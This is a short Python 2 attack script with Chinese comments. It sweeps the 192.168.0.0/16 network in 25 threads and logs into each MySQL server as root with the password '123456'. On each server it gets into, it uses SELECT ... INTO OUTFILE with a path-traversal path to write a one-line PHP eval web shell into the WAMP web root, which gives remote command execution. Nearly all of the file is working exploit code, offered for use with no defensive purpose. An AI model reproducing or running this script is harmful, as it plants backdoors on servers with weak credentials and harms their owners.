#!/usr/bin/env python
#coding=utf-8
#author:Blus

import MySQLdb
import threading
import time
import IPy

def mysql_connect1(ip,shell_url,shell_content):
    #尝试数据库连接
    try:
        conn=MySQLdb.connect(host=ip,user='root',passwd='123456',db='',port=3306)
        cur=conn.cursor()

        # 若数据库连接成功，开始写马
        try:

            sql_insert = "SELECT '{}'into outfile '{}';".format(shell_content,shell_url)
            print sql_insert;

            cur.execute(sql_insert)
            print "写入成功".decode()

        except Exception as e:
            print "写入错误"
            print e;
            return
        cur.close()
        conn.close()


    except MySQLdb.Error,e:
        print "Mysql_Error: %d: %s" % (e.args[0], e.args[1])
        return

if __name__ == "__main__":
    #内容设置
    shell_url='../../../../wamp64/www/erg2313231.php';
    shell_content='<?php @eval($_POST[cmd]); ?>'
    #设置同时运行的线程数
    threads=25
    #要检测的IP网段
    ip1 = IPy.IP('192.168.0.0/16')


    for ip in ip1:    
        ip=str(ip)
        while(threading.activeCount()>threads):
            time.sleep(1)
        threading.Thread(target=mysql_connect1, args=(ip, shell_url,shell_content)).start()
    print '检测结束'
